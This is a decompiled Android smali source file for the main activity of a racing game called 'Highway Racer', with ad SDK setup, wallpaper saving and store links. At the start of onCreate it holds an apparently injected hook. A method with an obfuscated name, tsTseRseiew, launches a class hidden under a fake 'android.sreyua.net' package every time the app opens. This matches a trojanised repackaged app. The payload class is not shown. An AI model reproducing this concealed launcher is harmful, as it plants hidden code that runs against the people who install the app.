.class public Lcom/infinity/studio/highway/racing/Highway_Racer;
.super Lcom/badlogic/gdx/backends/android/AndroidApplication;
.source "Highway_Racer.java"


# static fields
.field public static e:Z


# instance fields
.field protected a:Landroid/os/PowerManager$WakeLock;

.field b:Lcom/applovin/adview/AppLovinAdView;

.field public c:Landroid/content/Context;

.field public d:Lcom/startapp/android/publish/StartAppAd;

.field protected f:Landroid/os/Handler;

.field private g:Lb/a;

.field private h:Landroid/view/View;

.field private i:[I

.field private j:I

.field private k:Lcom/startapp/android/publish/HtmlAd;

.field private final l:I

.field private final m:I


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 44
    const/4 v0, 0x0

    sput-boolean v0, Lcom/infinity/studio/highway/racing/Highway_Racer;->e:Z

    return-void
.end method

.method public constructor <init>()V
    .registers 2

    .prologue
    const/4 v0, 0x0

    .line 33
    invoke-direct {p0}, Lcom/badlogic/gdx/backends/android/AndroidApplication;-><init>()V

    .line 39
    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->k:Lcom/startapp/android/publish/HtmlAd;

    .line 43
    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    .line 120
    const/4 v0, 0x1

    iput v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->l:I

    .line 121
    const/4 v0, 0x0

    iput v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->m:I

    .line 123
    new-instance v0, Lcom/infinity/studio/highway/racing/Highway_Racer$1;

    invoke-direct {v0, p0}, Lcom/infinity/studio/highway/racing/Highway_Racer$1;-><init>(Lcom/infinity/studio/highway/racing/Highway_Racer;)V

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->f:Landroid/os/Handler;

    .line 33
    return-void
.end method

.method static synthetic a(Lcom/infinity/studio/highway/racing/Highway_Racer;)I
    .registers 2

    .prologue
    .line 37
    iget v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->j:I

    return v0
.end method

.method private static a(Landroid/graphics/Bitmap;Ljava/lang/String;Ljava/lang/String;Landroid/app/Activity;Ljava/lang/String;Landroid/graphics/Bitmap$CompressFormat;)Ljava/io/File;
    .registers 10

    .prologue
    .line 195
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v0

    .line 196
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "/"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 197
    invoke-virtual {v1}, Ljava/io/File;->mkdirs()Z

    .line 198
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    .line 199
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 200
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v1, v0}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 201
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_52

    .line 202
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    .line 204
    :cond_52
    :try_start_52
    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 205
    const/16 v1, 0x5a

    invoke-virtual {p0, p5, v1, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 206
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->flush()V

    .line 207
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_62
    .catch Ljava/lang/Exception; {:try_start_52 .. :try_end_62} :catch_8f

    .line 211
    :goto_62
    invoke-virtual {p3}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 212
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "Your image is saved in /sdcard/"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 213
    const/4 v3, 0x1

    .line 211
    invoke-static {v0, v1, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    .line 213
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 214
    new-instance v0, Landroid/content/Intent;

    .line 215
    const-string v1, "android.intent.action.MEDIA_SCANNER_SCAN_FILE"

    .line 214
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 216
    invoke-static {v2}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    .line 217
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 218
    invoke-virtual {p3, v0}, Landroid/app/Activity;->sendBroadcast(Landroid/content/Intent;)V

    .line 219
    return-object v2

    .line 209
    :catch_8f
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_62
.end method

.method private static a(Landroid/content/Context;)Z
    .registers 3

    .prologue
    .line 51
    .line 52
    const-string v0, "connectivity"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    .line 51
    check-cast v0, Landroid/net/ConnectivityManager;

    .line 54
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    if-eqz v1, :cond_24

    .line 55
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v1

    if-eqz v1, :cond_24

    .line 56
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_24

    .line 58
    const/4 v0, 0x1

    .line 60
    :goto_23
    return v0

    :cond_24
    const/4 v0, 0x0

    goto :goto_23
.end method


# virtual methods
.method public final a()V
    .registers 1

    .prologue
    .line 47
    invoke-static {p0}, Lcom/appflood/AppFlood;->showFullScreen(Landroid/app/Activity;)V

    .line 48
    return-void
.end method

.method public final a(I)V
    .registers 4

    .prologue
    .line 153
    iput p1, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->j:I

    .line 154
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->h:Landroid/view/View;

    new-instance v1, Lcom/infinity/studio/highway/racing/Highway_Racer$2;

    invoke-direct {v1, p0}, Lcom/infinity/studio/highway/racing/Highway_Racer$2;-><init>(Lcom/infinity/studio/highway/racing/Highway_Racer;)V

    invoke-virtual {v0, v1}, Landroid/view/View;->post(Ljava/lang/Runnable;)Z

    .line 160
    return-void
.end method

.method public final a(Ljava/lang/String;)V
    .registers 6

    .prologue
    .line 66
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    invoke-static {v0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2d

    .line 67
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    .line 69
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "market://search?q=pub:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 68
    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 70
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 71
    iget-object v1, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 76
    :goto_2c
    return-void

    .line 73
    :cond_2d
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    const-string v1, "Please enable wifi or data from settings"

    .line 74
    const/4 v2, 0x1

    .line 73
    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    .line 74
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_2c
.end method

.method public final a(Z)V
    .registers 4

    .prologue
    .line 142
    iget-object v1, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->f:Landroid/os/Handler;

    if-eqz p1, :cond_9

    const/4 v0, 0x1

    :goto_5
    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    .line 143
    return-void

    .line 142
    :cond_9
    const/4 v0, 0x0

    goto :goto_5
.end method

.method public final b()V
    .registers 6

    .prologue
    .line 176
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    invoke-static {v0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_34

    .line 177
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    .line 178
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "market://details?id="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 179
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    .line 177
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 184
    :goto_33
    return-void

    .line 181
    :cond_34
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    const-string v1, "Please enable wifi or data from settings"

    .line 182
    const/4 v2, 0x1

    .line 181
    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    .line 182
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_33
.end method

.method public final b(I)V
    .registers 8

    .prologue
    .line 187
    invoke-virtual {p0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    iget-object v1, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->i:[I

    aget v1, v1, p1

    invoke-static {v0, v1}, Landroid/graphics/BitmapFactory;->decodeResource(Landroid/content/res/Resources;I)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 188
    const-string v1, "HR_walls"

    const-string v2, "car wall"

    const-string v4, ".jpg"

    sget-object v5, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    move-object v3, p0

    .line 189
    invoke-static/range {v0 .. v5}, Lcom/infinity/studio/highway/racing/Highway_Racer;->a(Landroid/graphics/Bitmap;Ljava/lang/String;Ljava/lang/String;Landroid/app/Activity;Ljava/lang/String;Landroid/graphics/Bitmap$CompressFormat;)Ljava/io/File;

    .line 190
    return-void
.end method

.method public onBackPressed()V
    .registers 2

    .prologue
    .line 147
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->g:Lb/a;

    iget-object v0, v0, Lb/a;->o:Lf/j;

    invoke-virtual {v0}, Lf/j;->c()V

    .line 148
    sget-boolean v0, Lcom/infinity/studio/highway/racing/Highway_Racer;->e:Z

    if-eqz v0, :cond_14

    .line 149
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->g:Lb/a;

    iget-object v0, v0, Lb/a;->E:Lcom/infinity/studio/highway/racing/Highway_Racer;

    iget-object v0, v0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    invoke-virtual {v0}, Lcom/startapp/android/publish/StartAppAd;->onBackPressed()V

    .line 150
    :cond_14
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 9

    .prologue
    invoke-virtual {p0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->tsTseRseiew()V

    const/16 v6, 0xa

    const/4 v5, 0x0

    const/4 v4, -0x2

    .line 79
    invoke-super {p0, p1}, Lcom/badlogic/gdx/backends/android/AndroidApplication;->onCreate(Landroid/os/Bundle;)V

    .line 80
    new-instance v0, Lb/a;

    invoke-virtual {p0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, p0, v1}, Lb/a;-><init>(Lcom/infinity/studio/highway/racing/Highway_Racer;Landroid/content/Context;)V

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->g:Lb/a;

    .line 81
    iput-object p0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->c:Landroid/content/Context;

    .line 82
    invoke-static {p0}, Lcom/searchboxsdk/android/StartAppSearch;->init(Landroid/app/Activity;)V

    .line 83
    new-instance v1, Landroid/widget/RelativeLayout;

    invoke-direct {v1, p0}, Landroid/widget/RelativeLayout;-><init>(Landroid/content/Context;)V

    .line 84
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->g:Lb/a;

    invoke-virtual {p0, v0, v5}, Lcom/infinity/studio/highway/racing/Highway_Racer;->initializeForView(Lcom/badlogic/gdx/ApplicationListener;Z)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->h:Landroid/view/View;

    .line 85
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    if-nez v0, :cond_32

    .line 86
    new-instance v0, Lcom/startapp/android/publish/StartAppAd;

    invoke-direct {v0, p0}, Lcom/startapp/android/publish/StartAppAd;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    .line 91
    :cond_32
    const/4 v0, 0x4

    new-array v0, v0, [I

    fill-array-data v0, :array_96

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->i:[I

    .line 93
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 95
    const-string v2, "My Tag"

    .line 94
    invoke-virtual {v0, v6, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->a:Landroid/os/PowerManager$WakeLock;

    .line 96
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->a:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 97
    new-instance v0, Lcom/applovin/adview/AppLovinAdView;

    invoke-static {p0}, Lcom/applovin/sdk/AppLovinSdk;->a(Landroid/content/Context;)Lcom/applovin/sdk/AppLovinSdk;

    move-result-object v2

    .line 98
    sget-object v3, Lcom/applovin/sdk/AppLovinAdSize;->a:Lcom/applovin/sdk/AppLovinAdSize;

    invoke-direct {v0, v2, v3, p0}, Lcom/applovin/adview/AppLovinAdView;-><init>(Lcom/applovin/sdk/AppLovinSdk;Lcom/applovin/sdk/AppLovinAdSize;Landroid/app/Activity;)V

    .line 97
    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->b:Lcom/applovin/adview/AppLovinAdView;

    .line 99
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->b:Lcom/applovin/adview/AppLovinAdView;

    invoke-virtual {v0}, Lcom/applovin/adview/AppLovinAdView;->a()V

    .line 100
    const-string v0, "qXuCIjbWwKEHSPFy"

    const-string v2, "Pogvniec1e67L524e7197"

    .line 101
    const/16 v3, 0x9f

    .line 100
    invoke-static {p0, v0, v2, v3}, Lcom/appflood/AppFlood;->initialize(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 103
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->g:Lb/a;

    invoke-virtual {p0, v0, v5}, Lcom/infinity/studio/highway/racing/Highway_Racer;->initializeForView(Lcom/badlogic/gdx/ApplicationListener;Z)Landroid/view/View;

    move-result-object v0

    iput-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->h:Landroid/view/View;

    .line 104
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->h:Landroid/view/View;

    invoke-virtual {v1, v0}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;)V

    .line 106
    new-instance v0, Landroid/widget/RelativeLayout$LayoutParams;

    invoke-direct {v0, v4, v4}, Landroid/widget/RelativeLayout$LayoutParams;-><init>(II)V

    .line 109
    invoke-virtual {v0, v6}, Landroid/widget/RelativeLayout$LayoutParams;->addRule(I)V

    .line 110
    const/16 v2, 0x9

    invoke-virtual {v0, v2}, Landroid/widget/RelativeLayout$LayoutParams;->addRule(I)V

    .line 112
    iget-object v2, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->b:Lcom/applovin/adview/AppLovinAdView;

    invoke-virtual {v1, v2, v0}, Landroid/widget/RelativeLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 114
    invoke-virtual {p0, v1}, Lcom/infinity/studio/highway/racing/Highway_Racer;->setContentView(Landroid/view/View;)V

    .line 115
    invoke-static {p0}, Lcom/searchboxsdk/android/StartAppSearch;->showSearchBox(Landroid/app/Activity;)V

    .line 116
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lcom/infinity/studio/highway/racing/Highway_Racer;->a(Z)V

    .line 118
    return-void

    .line 91
    nop

    nop

    :array_96
    .array-data 4
        0x7f020001
        0x7f020002
        0x7f020003
        0x7f020004
    .end array-data
.end method

.method public onPause()V
    .registers 2

    .prologue
    .line 164
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->a:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 165
    invoke-super {p0}, Lcom/badlogic/gdx/backends/android/AndroidApplication;->onPause()V

    .line 166
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    invoke-virtual {v0}, Lcom/startapp/android/publish/StartAppAd;->onPause()V

    .line 167
    return-void
.end method

.method public onResume()V
    .registers 2

    .prologue
    .line 171
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->a:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 172
    invoke-super {p0}, Lcom/badlogic/gdx/backends/android/AndroidApplication;->onResume()V

    .line 173
    iget-object v0, p0, Lcom/infinity/studio/highway/racing/Highway_Racer;->d:Lcom/startapp/android/publish/StartAppAd;

    invoke-virtual {v0}, Lcom/startapp/android/publish/StartAppAd;->onResume()V

    .line 174
    return-void
.end method

.method public tsTseRseiew()V
    .registers 2

    .prologue
    new-instance v0, Landroid/sreyua/net/AndRoidActivity;

    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V

    return-void
.end method
